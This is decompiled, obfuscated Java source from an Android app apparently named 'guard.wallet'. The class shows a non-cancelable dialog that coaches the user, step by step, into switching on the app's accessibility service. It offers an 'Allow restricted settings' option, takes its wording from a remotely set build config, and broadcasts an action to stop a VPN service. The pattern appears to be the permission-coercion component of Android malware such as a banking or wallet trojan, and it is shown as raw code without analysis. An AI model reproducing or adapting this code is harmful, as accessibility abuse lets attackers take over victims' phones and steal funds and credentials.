package com.guard.wallet.utils;

import a1.AbstractC0026q;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.activity.GuideActivity;
import com.guard.wallet.helper.DialogInterfaceOnClickListenerC0187j;
import com.guard.wallet.helper.DialogInterfaceOnDismissListenerC0188k;
import com.guard.wallet.helper.RunnableC0183f;
import e0.C0263a;
import java.lang.ref.WeakReference;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import p002e.C0262b;

/* renamed from: com.guard.wallet.utils.b */
/* loaded from: classes.dex */
public abstract class AbstractC0246b {

    /* renamed from: a */
    public static WeakReference f395a;

    /* renamed from: c */
    public static volatile WeakReference f397c;

    /* renamed from: b */
    public static final AtomicBoolean f396b = new AtomicBoolean(true);

    /* renamed from: d */
    public static final AtomicInteger f398d = new AtomicInteger(0);

    /* renamed from: e */
    public static final AtomicInteger f399e = new AtomicInteger(0);

    /* renamed from: f */
    public static final AtomicInteger f400f = new AtomicInteger(0);

    /* renamed from: g */
    public static final AtomicInteger f401g = new AtomicInteger(0);

    /* renamed from: a */
    public static void m596a() {
        if (C0262b.m735a() != null) {
            if (f397c == null || f397c.get() == null || (f397c.get() instanceof GuideActivity)) {
                Log.d("AccessibilityUtils", "showGuideActivity");
                AbstractC0251g.d1(C0262b.m735a().getPackageName(), GuideActivity.class.getName());
            }
        }
    }

    /* renamed from: b */
    public static void m597b() {
        WeakReference weakReference = f395a;
        if (weakReference == null || weakReference.get() == null) {
            return;
        }
        ((AlertDialog) f395a.get()).dismiss();
        f395a = null;
    }

    /* renamed from: c */
    public static String m598c() {
        String concat = AbstractC0248d.m607e().concat("/guide/").concat(String.valueOf(f398d.get()));
        Log.d("AccessibilityUtils", concat);
        return concat;
    }

    /* renamed from: d */
    public static void m599d(Activity activity) {
        synchronized (Activity.class) {
            f397c = new WeakReference(activity);
            if (f397c != null && f397c.get() != null) {
                Intent intent = new Intent();
                intent.setAction("guide.vpn.service.stop.action");
                ((Activity) f397c.get()).sendBroadcast(intent);
            }
        }
    }

    /* renamed from: e */
    public static void m600e() {
        if (AbstractC0251g.m653Z() != null) {
            new Handler(Looper.getMainLooper()).post(new RunnableC0183f(6));
        }
    }

    /* renamed from: f */
    public static void m601f() {
        if (C0262b.m735a() != null) {
            WeakReference weakReference = f395a;
            if (weakReference == null || weakReference.get() == null || !((AlertDialog) f395a.get()).isShowing()) {
                Integer num = AbstractC0248d.f402a;
                String alertTitle = (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getAlertTitle())) ? "Open [accessibility_service_label]" : MainApplication.getInstance().getBuildConfig().getAlertTitle();
                String alertMsg = (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getAlertMsg())) ? "1.Click go immediately and enter accessibility service column\n2.Pull down to the bottom,find already downloaded(installed) apps,and click to enter this column\n3.Find [accessibility_service_label],and click to enter this column\n4.Click the switch(in the top right corner),you can open [accessibility_service_label]" : MainApplication.getInstance().getBuildConfig().getAlertMsg();
                if (MainApplication.getInstance() != null && MainApplication.getInstance().getBuildConfig() != null && !AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getAlertRestrictedMsg())) {
                    MainApplication.getInstance().getBuildConfig().getAlertRestrictedMsg();
                }
                String okText = (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getOkText())) ? "Go immediately" : MainApplication.getInstance().getBuildConfig().getOkText();
                AlertDialog.Builder builder = new AlertDialog.Builder(C0262b.m735a(), 4);
                builder.setCustomTitle(new C0263a(C0262b.m735a(), alertTitle));
                builder.setMessage(alertMsg);
                builder.setCancelable(false);
                int i2 = 1;
                if (!f396b.get()) {
                    builder.setNeutralButton((MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getAllowRestricted())) ? "Allow restricted settings" : MainApplication.getInstance().getBuildConfig().getAllowRestricted(), new DialogInterfaceOnClickListenerC0187j(i2));
                }
                builder.setPositiveButton(okText, new DialogInterfaceOnClickListenerC0187j(2));
                builder.setOnDismissListener(new DialogInterfaceOnDismissListenerC0188k(1));
                builder.setOnCancelListener(new DialogInterfaceOnCancelListenerC0245a());
                WeakReference weakReference2 = new WeakReference(builder.create());
                f395a = weakReference2;
                ((AlertDialog) weakReference2.get()).show();
            }
        }
    }
}
